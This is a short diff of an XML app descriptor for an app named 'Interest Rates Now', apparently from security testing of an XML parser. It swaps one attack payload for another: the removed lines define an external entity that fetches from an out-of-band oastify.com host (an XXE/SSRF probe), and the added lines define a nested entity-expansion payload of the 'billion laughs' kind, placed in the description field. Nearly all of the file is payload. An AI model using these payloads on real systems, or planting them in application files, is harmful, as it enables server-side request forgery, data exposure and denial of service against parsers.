@@ -1,13 +1,12 @@
-<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data ANY >
-<!ENTITY ssrf SYSTEM "http://xklhdajtoik39nc4a4epaj646vcm0dt1i.oastify.com/somefile">
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lola "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 ]>
 <app>
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
      <provider>Interest Rater</provider>
-     <description>&ssrf;</description>
+     <description>&lola;</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
           <label>label</label>
